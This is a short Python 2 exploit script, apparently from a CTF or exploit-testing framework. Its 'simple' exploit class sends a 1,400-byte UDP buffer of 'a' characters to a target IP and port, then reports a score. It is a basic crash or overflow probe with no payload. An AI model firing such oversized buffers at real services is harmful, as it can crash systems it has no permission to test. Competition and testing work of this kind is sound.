#!/usr/bin/python

from reporter import *
from base_exploit import *


class simple(base_exploit):
    id = EXPLOIT_ID_SIMPLE

    def exploit(self, ip, port):
        reporter = reporter_init()

        # Create the socket
        s = socket(AF_INET, SOCK_DGRAM)

        # Connect to the target
        s.connect((ip, port))

        # Send a big buffer
        s.send("a" * 1400)

        return reporter_wait(reporter)


if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print "Simple exploit"
        print "Usage: %s <ip> <Wrapper RECV port>" % (sys.argv[0])
        exit(0)

    exp = simple(TEAM_CONFIG_DEBUG)
    score = exp.run()
    print "exploit returned score %s" % score